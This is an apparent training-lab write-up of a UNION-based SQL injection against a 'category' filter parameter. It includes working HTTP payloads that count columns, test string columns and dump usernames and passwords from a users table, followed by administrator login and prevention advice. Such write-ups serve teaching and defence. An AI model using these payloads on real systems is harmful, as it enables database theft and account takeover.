# SQL Injection UNION Attack - Retrieving Data from Other Tables

## Objective

Use a UNION-based SQL injection attack to retrieve usernames and passwords from another table and log in as the administrator user.

## Vulnerable Parameter

`category`

## Step 1: Determine the Number of Columns

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT NULL,NULL-- HTTP/2
```

Result:
- Success
- No error returned

Conclusion:
- The original query returns 2 columns.

## Step 2: Find Text-Compatible Columns

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT 'test',NULL-- HTTP/2
```

Result:
- Success

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT NULL,'test'-- HTTP/2
```

Result:
- Success

Conclusion:
- Both columns accept string data.

## Step 3: Retrieve Data from the Users Table

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT username,password FROM users-- HTTP/2
```

Result:
- Usernames and passwords from the `users` table were displayed in the response.
- Administrator credentials were included in the results.

## Step 4: Log In as Administrator

Using the administrator credentials retrieved from the database, I logged in as the administrator user and solved the lab.

## Explanation

The UNION operator combines the results of two SELECT statements.

The original query returned two columns, and both columns accepted string data. This made it possible to retrieve and display data from the `users` table using:

```sql
UNION SELECT username,password FROM users
```

As a result, sensitive information stored in another table became visible in the application's response.

## Security Impact

An attacker could:

- Retrieve usernames and passwords.
- Compromise user accounts.
- Gain administrative access.
- Access sensitive information stored in the database.

## Prevention

- Use parameterized queries (prepared statements).
- Avoid building SQL queries through string concatenation.
- Validate and sanitize user input.
- Apply the principle of least privilege to database accounts.
- Perform regular security testing.

## Key Concepts Learned

- UNION-based SQL injection
- Determining column counts
- Identifying text-compatible columns
- Retrieving data from other tables
- Authentication compromise through database disclosure
